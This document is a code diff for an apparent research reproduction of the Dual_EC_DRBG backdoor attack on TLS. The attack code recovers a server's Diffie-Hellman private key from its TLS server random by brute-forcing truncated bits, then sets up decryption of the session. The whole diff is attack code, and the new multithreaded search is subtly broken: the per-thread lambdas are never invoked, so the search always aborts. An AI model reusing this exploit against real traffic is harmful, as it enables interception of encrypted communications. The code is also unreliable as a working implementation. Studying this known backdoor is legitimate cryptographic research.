@@ -5,6 +5,7 @@
 #include "mbedtls/cipher.h"
 #include <array>
 #include <bits/stdint-uintn.h>
+#include <cstdlib>
 #include <gmp++/gmp++_int.h>
 #include <iomanip>
 #include <ios>
@@ -228,30 +229,8 @@ BitStr bitstr_from_barr(barr input)
     return out;
 }
 
-int main()
+std::optional<BigInt> try_calc_private_key(BitStr const& guessed_stripped_bits, BitStr const& guessed_last4, BitStr const& inner_dec_serv_rand, Input const& input, DEC::WorkingState& working_state)
 {
-    auto input = setup_input();
-    auto working_state = DEC::WorkingState {
-            .s = BitStr(-1),
-            .seedlen = DEC::pick_seedlen(input.dec_security_strength),
-            .dec_curve = input.dec_curve,
-            .outlen = DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength))};
-
-    /* Input:
-     *      TLS: server-random, client-random,
-     *      DH: generator, prime, bitlength of a (TODO: not transferred, but maybe inferred?), pubKeyServer = g^a (mod p), pubKeyClient = g^b (mod p).
-     *      DualEC: security-stength, Q, d, s.t. dQ = P, adins used for generating, personalization string
-     * Assumption:
-     *      server used DualEC to generate server-random and (a+1),
-     *      for now: used cipher: MBEDTLS_CIPHER_CHACHA20_POLY1305
-     */
-    /* Step 1: Strip the first 4 bytes of server-random, because it's the unix timestamp. */
-    barr inner_dec_serv_rand_barr = barr(input.server_random.begin() + 4, input.server_random.end());
-    BitStr inner_dec_serv_rand = bitstr_from_barr(inner_dec_serv_rand_barr);
-    /* Step 2: Guess the last 4 bytes (because they were stripped to make room for the unix timestamp)
-     *         and the stripped bits from the front */
-    BitStr guessed_last4 = BitStr(-1);
-    BitStr guessed_stripped_bits = BitStr(-1);
     BitStr guessed_r = guessed_stripped_bits + inner_dec_serv_rand + guessed_last4;
     /* Step 3: Calculate the next state s_(i+1) */
     BitStr s_opt1 = BitStr(0), s_opt2 = BitStr(0);
@@ -265,9 +244,75 @@ int main()
         /* Step 5: Calculate g^a (mod p) and check if it matches pubKeyServer
          *         If it didn't go to step 2.*/
         auto ga = Givaro::powmod(input.dh_generator, a, input.dh_prime);
-        if (ga == input.dh_pubkey_server) // sadge
-            abort();
+        if (ga == input.dh_pubkey_server)
+            return a;
     }
+    return {};
+}
+
+struct Iterator {
+    Iterator(BigInt start, BigInt end_excl)
+        : start(std::move(start))
+        , end(std::move(end_excl))
+        , m_current(start - 1)
+    {
+    }
+    BigInt start;
+    BigInt end;
+    [[nodiscard]] BigInt current() const { if (m_current >= end) abort();
+        return m_current; }
+    [[nodiscard]] bool has_next() const { return m_current + 1 < end; }
+    BigInt advance() { return ++m_current; }
+private:
+    BigInt m_current;
+};
+
+BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, Input const& input)
+{
+    auto stripped_amount_of_bits = DEC::pick_seedlen(input.dec_security_strength) - DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength));
+    auto full_amound_stripped = stripped_amount_of_bits + 4*8;
+
+    /* Step 2: Guess the last 4 bytes (because they were stripped to make room for the unix timestamp)
+     *         and the stripped bits from the front */
+    auto strip_bound = BigInt(1) << full_amound_stripped;
+    auto strip_per_thread = strip_bound / no_of_threads;
+
+    for (BigInt thread_start(0), thread_end(strip_per_thread); thread_end <= strip_bound; thread_end += strip_per_thread, thread_start += strip_per_thread) {
+        auto lambda = [thread_start, thread_end, full_amound_stripped, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() {
+             auto working_state = DEC::WorkingState {
+                .s = BitStr(-1),
+                .seedlen = DEC::pick_seedlen(input.dec_security_strength),
+                .dec_curve = input.dec_curve,
+                .outlen = DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength))};
+            auto guesser = Iterator(thread_start, thread_end);
+            while (guesser.has_next()) {
+                auto guess = BitStr(guesser.advance(), full_amound_stripped);
+                BitStr guessed_last4 = guess.truncated_leftmost(4*8);
+                BitStr guessed_stripped_bits = guess.truncated_rightmost(stripped_amount_of_bits);
+                auto result = try_calc_private_key(guessed_stripped_bits,guessed_last4, inner_dec_serv_rand, input, working_state);
+                if (result.has_value())
+                    return result;
+            }
+        };
+    }
+    std::cout << "Unexpected end of brute force" << std::endl;
+    abort();
+}
+
+int main()
+{
+    auto input = setup_input();
+    /* Input:
+     *      TLS: server-random, client-random,
+     *      DH: generator, prime, bitlength of a (TODO: not transferred, but maybe inferred?), pubKeyServer = g^a (mod p), pubKeyClient = g^b (mod p).
+     *      DualEC: security-stength, Q, d, s.t. dQ = P, adins used for generating, personalization string
+     * Assumption:
+     *      server used DualEC to generate server-random and (a+1),
+     *      for now: used cipher: MBEDTLS_CIPHER_CHACHA20_POLY1305
+     */
+    /* Step 1: Strip the first 4 bytes of server-random, because it's the unix timestamp. */
+    BitStr inner_dec_serv_rand = bitstr_from_barr(barr(input.server_random.begin() + 4, input.server_random.end()));
+    BigInt server_private = guess_server_private_key(inner_dec_serv_rand, input);
     /* Step 6: Calculate the pre-master-secret with pubKeyClient^a (mod p) */
     /* Step 7: Calculate the master secret with the given information */
     /* Step 8: Calculate the working_keys and decrpyt the message */
